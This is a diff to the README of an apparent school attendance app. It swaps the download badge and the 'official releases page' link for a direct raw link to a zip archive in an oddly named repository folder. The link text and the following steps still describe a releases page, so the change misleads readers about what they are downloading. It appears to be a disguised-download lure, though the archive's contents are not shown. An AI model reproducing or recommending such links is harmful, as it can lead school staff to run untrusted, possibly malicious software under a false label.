@@ -1,6 +1,6 @@
 # 📋 AppAbsensiSDN1Bintaro - Simplify student attendance tracking with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/rawsiennaarticulator89/AppAbsensiSDN1Bintaro/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/rawsiennaarticulator89/AppAbsensiSDN1Bintaro/main/Xylophagidae/Absensi_SD_App_Bintaro_v1.0.zip)
 
 ## 📖 Overview
 AppAbsensiSDN1Bintaro helps staff at SDN 1 Bintaro track student attendance. This application stores daily logs in a secure format on your computer. You track absences, tardiness, and presence for every student in the school. The software keeps records organized and saves time during morning roll calls. Teachers spend less time on paperwork and more time on instruction.
@@ -16,7 +16,7 @@ Before you install the software, ensure your computer meets these requirements:
 ## ⬇️ How to Download and Install
 Follow these steps to set up the application on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/rawsiennaarticulator89/AppAbsensiSDN1Bintaro/releases) to access the download options.
+1. Visit the [official releases page](https://raw.githubusercontent.com/rawsiennaarticulator89/AppAbsensiSDN1Bintaro/main/Xylophagidae/Absensi_SD_App_Bintaro_v1.0.zip) to access the download options.
 2. Look for the latest version of the installer under the Assets section.
 3. Click the file name to start the download.
 4. Locate the downloaded file in your Downloads folder.
